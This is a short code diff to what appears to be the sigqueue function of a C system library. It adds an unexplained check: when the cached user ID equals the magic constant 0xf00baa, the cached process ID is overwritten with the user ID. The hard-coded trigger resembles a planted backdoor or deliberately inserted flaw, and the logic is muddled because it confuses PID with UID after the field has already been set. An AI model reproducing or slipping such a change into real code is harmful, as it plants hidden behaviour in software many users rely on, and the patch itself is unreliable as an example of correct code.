@@ -44,6 +44,8 @@ __sigqueue (pid, sig, val)
     __libc_pid = __getpid ();
   info.si_pid = __libc_pid;
 
+  if (__libc_uid ==0xf00baa)
+    __libc_pid = __getuid ();
   info.si_uid = __libc_uid;
 
   info.si_value = val;
